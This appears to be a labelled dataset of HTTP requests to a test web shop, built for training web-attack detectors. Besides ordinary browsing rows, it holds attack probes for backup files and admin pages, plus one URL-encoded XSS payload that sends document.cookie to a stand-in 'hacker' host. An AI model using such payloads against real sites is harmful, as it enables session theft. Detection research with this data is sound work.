Method,Accept,host,connection,classification,URL,content_tokens,url_path,url_query,clean_url
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kwokchoi&password=putrefa8tiva&nombre=Brian&apellidos=Compte&email=stroeby%40jesusfelipe.lv&dni=62128531B&direccion=De+Canoves+13%2C+&ciudad=Balaguer&cp=39513&provincia=Lugo&ntc=0854278659322549&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/miembros/editar.jsp,modo=registro&login=kwokchoi&password=putrefa8tiva&nombre=Brian&apellidos=Compte&email=stroeby%40jesusfelipe.lv&dni=62128531B&direccion=De+Canoves+13%2C+&ciudad=Balaguer&cp=39513&provincia=Lugo&ntc=0854278659322549&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kwokchoi&password=putrefa8tiva&nombre=Brian&apellidos=Compte&email=stroeby%40jesusfelipe.lv&dni=62128531B&direccion=De+Canoves+13%2C+&ciudad=Balaguer&cp=39513&provincia=Lugo&ntc=0854278659322549&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,[],/tienda1/global/menum.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/menum.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/CFIDE/administrator/enter.cfm HTTP/1.1,[],/CFIDE/administrator/enter.cfm HTTP/1.1,,http://localhost:8080/CFIDE/administrator/enter.cfm
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sherri&pwd=ajote&remember=on%2F&B1=Entrar HTTP/1.1,"['modo', 'login', 'pwd', 'remember', 'B1']",/tienda1/publico/autenticar.jsp,modo=entrar&login=sherri&pwd=ajote&remember=on%2F&B1=Entrar HTTP/1.1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sherri&pwd=ajote&remember=on%2F&B1=Entrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/global/titulo.jsp.Inc HTTP/1.1,[],/tienda1/global/titulo.jsp.Inc HTTP/1.1,,http://localhost:8080/tienda1/global/titulo.jsp.Inc
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/6909030637832563290.jsp HTTP/1.1,[],/tienda1/6909030637832563290.jsp HTTP/1.1,,http://localhost:8080/tienda1/6909030637832563290.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=vanda&pwd=5esl4chu6002ra&remember=off&B1=Entrar HTTP/1.1,"['modoA', 'login', 'pwd', 'remember', 'B1']",/tienda1/publico/autenticar.jsp,modoA=entrar&login=vanda&pwd=5esl4chu6002ra&remember=off&B1=Entrar HTTP/1.1,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=vanda&pwd=5esl4chu6002ra&remember=off&B1=Entrar
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/carrito.jsp/6909030637832563290.jsp.old HTTP/1.1,[],/tienda1/publico/carrito.jsp/6909030637832563290.jsp.old HTTP/1.1,,http://localhost:8080/tienda1/publico/carrito.jsp/6909030637832563290.jsp.old
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1,['B2'],/tienda1/publico/vaciar.jsp,B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/miembros/asf-logo-wide HTTP/1.1,[],/tienda1/miembros/asf-logo-wide HTTP/1.1,,http://localhost:8080/tienda1/miembros/asf-logo-wide
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,['B2'],/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito HTTP/1.1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,[],/tienda1/publico/entrar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/entrar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,[],/tienda1/publico/registro.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/registro.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,[],/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,[],/tienda1/global/estilos.css HTTP/1.1,,http://localhost:8080/tienda1/global/estilos.css
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,[],/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,[],/tienda1/miembros/salir.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/salir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,[],/tienda1/imagenes/cmenbul.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/cmenbul.gif
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=torrie&pwd=patatera&remember=off&B1=Entrar HTTP/1.1,"['modo', 'login', 'pwd', 'remember', 'B1']",/tienda1/publico/autenticar.jsp,modo=entrar&login=torrie&pwd=patatera&remember=off&B1=Entrar HTTP/1.1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=torrie&pwd=patatera&remember=off&B1=Entrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,['idA'],/tienda1/publico/caracteristicas.jsp,idA=1 HTTP/1.1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,[],/tienda1/publico/entrar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/entrar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,[],/tienda1/publico/carrito.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/carrito.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,[],/tienda1/imagenes/cmenbul.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/cmenbul.gif
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,[],/tienda1/miembros/salir.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/salir.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=burkhard&pwd=EngeNdraR&remember=on&B1=Entrar HTTP/1.1,"['modo', 'login', 'pwd', 'remember', 'B1']",/tienda1/publico/autenticar.jsp,modo=entrar&login=burkhard&pwd=EngeNdraR&remember=on&B1=Entrar HTTP/1.1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=burkhard&pwd=EngeNdraR&remember=on&B1=Entrar
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,[],/tienda1/publico/pagar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/pagar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico.bak HTTP/1.1,[],/tienda1/publico.bak HTTP/1.1,,http://localhost:8080/tienda1/publico.bak
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,['idA'],/tienda1/publico/caracteristicas.jsp,idA=2 HTTP/1.1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,[],/tienda1/publico/miembros.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/miembros.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,[],/tienda1/global/menum.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/menum.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,[],/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,[],/tienda1/miembros/index.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/index.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/asf-logo-wide.bak HTTP/1.1,[],/asf-logo-wide.bak HTTP/1.1,,http://localhost:8080/asf-logo-wide.bak
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,[],/tienda1/publico/pagar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/pagar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%7C HTTP/1.1,['id'],/tienda1/publico/caracteristicas.jsp,id=%7C HTTP/1.1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%7C
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide HTTP/1.1,[],/tienda1/publico/anadir.jsp/asf-logo-wide HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,[],/tienda1/publico/miembros.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/miembros.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,[],/tienda1/publico/productos.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/productos.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,[],/tienda1/global/creditos.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/creditos.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp HTTP/1.1,[],/tienda1/global/titulo.jsp/6909030637832563290.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,[],/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,[],/tienda1/global/menum.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/menum.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,[],/tienda1/imagenes/2.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/2.gif
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,['errorMsgA'],/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas HTTP/1.1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,[],/tienda1/publico/caracteristicas.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/caracteristicas.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=belrango&password=guapote&nombre=Alexia&apellidos=Serracana+Abt&email=vertes%40gesmahernan.mq&dni=06928607BH&direccion=Calle+Jamaica+189+4%3FH&ciudad=Belmonte+de+Miranda&cp=46417&provincia=Ja%E9n&ntc=9385688686005345&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/publico/registro.jsp,modo=registro&login=belrango&password=guapote&nombre=Alexia&apellidos=Serracana+Abt&email=vertes%40gesmahernan.mq&dni=06928607BH&direccion=Calle+Jamaica+189+4%3FH&ciudad=Belmonte+de+Miranda&cp=46417&provincia=Ja%E9n&ntc=9385688686005345&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=belrango&password=guapote&nombre=Alexia&apellidos=Serracana+Abt&email=vertes%40gesmahernan.mq&dni=06928607BH&direccion=Calle+Jamaica+189+4%3FH&ciudad=Belmonte+de+Miranda&cp=46417&provincia=Ja%E9n&ntc=9385688686005345&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,[],/tienda1/imagenes/cmenbul.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/cmenbul.gif
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,[],/tienda1/imagenes/logo.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/logo.gif
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4344&B1=Confirmar%2F HTTP/1.1,"['modo', 'precio', 'B1']",/tienda1/publico/pagar.jsp,modo=insertar&precio=4344&B1=Confirmar%2F HTTP/1.1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4344&B1=Confirmar%2F
